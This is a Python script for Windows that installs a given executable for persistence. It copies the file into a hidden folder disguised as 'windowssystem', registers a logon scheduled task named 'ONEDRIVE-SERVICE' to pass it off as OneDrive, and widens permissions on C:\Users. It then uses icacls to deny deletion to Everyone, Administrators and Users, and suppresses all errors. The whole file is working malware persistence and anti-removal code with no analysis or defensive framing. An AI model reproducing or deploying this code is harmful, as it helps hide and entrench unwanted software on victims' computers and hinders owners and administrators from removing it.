import os
import shutil
import subprocess
import sys
import time
import random
import win32file

def setup_tasks(executable_path):
    target_dir = r"C:\Users\windowssystem"
    target_exe = os.path.join(target_dir, "starter.exe")
    try:
        os.makedirs(target_dir, exist_ok=True)
        os.listdir(target_dir)
    except:
        return
    try:
        subprocess.run('icacls "C:\\Users" /grant %username%:F', shell=True)
    except:
        pass
    try:
        if os.path.exists(target_exe):
            os.remove(target_exe)
        shutil.copy2(executable_path, target_exe)
    except:
        return
    try:
        if os.path.exists(target_exe):
            win32file.SetFileAttributes(target_dir, win32file.FILE_ATTRIBUTE_HIDDEN)
            win32file.SetFileAttributes(target_exe, win32file.FILE_ATTRIBUTE_HIDDEN)
    except:
        pass
    task_name_logon = "ONEDRIVE-SERVICE"
    create_task_logon_cmd = f'schtasks /create /tn "{task_name_logon}" /tr "{target_exe}" /sc onlogon /f'
    for _ in range(3):
        try:
            subprocess.run(create_task_logon_cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=20)
            break
        except:
            pass
    try:
        subprocess.run(f'icacls "{target_dir}" /deny *S-1-1-0:(D)', shell=True, check=True)
        subprocess.run(f'icacls "{target_dir}" /deny *S-1-5-32-544:(D)', shell=True, check=True)
        subprocess.run(f'icacls "{target_dir}" /deny *S-1-5-32-545:(D)', shell=True, check=True)
    except:
        pass